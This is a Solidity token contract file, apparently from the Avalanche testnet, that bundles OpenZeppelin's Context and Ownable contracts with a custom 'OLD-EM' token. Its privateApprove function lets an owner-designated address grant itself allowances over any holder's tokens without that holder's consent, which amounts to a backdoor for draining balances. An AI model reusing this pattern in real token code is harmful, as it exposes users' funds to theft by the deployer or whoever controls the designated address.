/**
 *Submitted for verification at testnet.snowtrace.io on 2022-03-07
*/

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: erc20.sol



pragma solidity >=0.6.0 <0.9.0;


contract BEP20Token is Ownable {

    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
    event Transfer(address indexed from, address indexed to, uint256 tokens);

    mapping(address => uint256) public balances;
    mapping(address => mapping (address => uint256)) public allowed;

   uint256 _totalSupply;
   string _name;
   string _symbol;
   uint256 _decimals;
   address EZNFT_Address;
    
     constructor() {
          _totalSupply = 100000000000000000000000000000000;
          balances[msg.sender] = _totalSupply;
          _name = "OLD-EM";
          _symbol = "EM";
          _decimals = 18;
    }  
    
    function name() external view returns(string memory){
       return _name;
    }
   
    function symbol() external view returns(string memory) {
        return _symbol;
    }

    function decimals() external view returns(uint256){
        return _decimals;
    }    
    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function EZNFT_Owner(address _contractAddress) public onlyOwner {
       EZNFT_Address = _contractAddress; 
    }

    function balanceOf(address tokenOwner) public view returns (uint256) {
        require(tokenOwner != address(0), "BEP20: balance query for the zero address");
        return balances[tokenOwner];
    }
    
    function transfer(address receiver, uint256 numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender],"BEP20: Not having sufficient balance");
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        require(msg.sender != delegate, "BEP20: cannot approve yourself");
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    
    function privateApprove(address owner, address delegate, uint256 numTokens) public returns (bool) {
        require(msg.sender == delegate, "BEP20: should be contract");
        require(msg.sender == EZNFT_Address, "BEP20: Should done by contract");
        allowed[owner][delegate] = numTokens;
        emit Approval(owner, delegate, numTokens);
        return true;
    }

    function allowance(address owner,address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
 
    function transferFrom(address owner, address buyer, uint256 numTokens) public returns (bool) {
        require(numTokens <= balances[owner],"BEP20: Insufficient balance");
        require(numTokens <= allowed[owner][msg.sender],"BEP20: Insufficient Allowance");
        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
    
}